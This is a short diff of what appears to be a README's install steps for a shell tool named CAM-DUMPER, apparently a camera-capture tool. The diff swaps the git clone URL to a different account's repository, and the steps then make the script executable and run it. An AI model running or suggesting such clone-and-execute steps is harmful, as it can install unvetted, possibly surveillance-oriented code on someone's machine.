@@ -6,7 +6,7 @@
 ```
 $ apt update && apt upgrade
 $ apt install git php wget curl jq
-$ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
+$ git clone https://github.com/kal1l1nux1337/cam-dumper.git
 $ cd CAM-DUMPER
 $ chmod +x camdumper.sh
 $ ./camdumper.sh
